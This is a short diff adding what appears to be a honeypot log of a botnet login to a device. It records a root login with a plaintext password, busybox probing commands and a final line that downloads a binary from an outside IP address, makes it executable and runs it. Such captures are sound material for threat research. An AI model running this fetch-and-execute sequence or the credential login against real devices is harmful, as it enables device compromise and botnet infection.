@@ -1,0 +1,13 @@
+from: 109.105.251.136:43086 user:root password:zsun1188
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox RFSTG
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox RFSTG
+tftp; wget; /bin/busybox RFSTG
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox RFSTG
+rm .s; wget http://114.35.31.116:1134/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
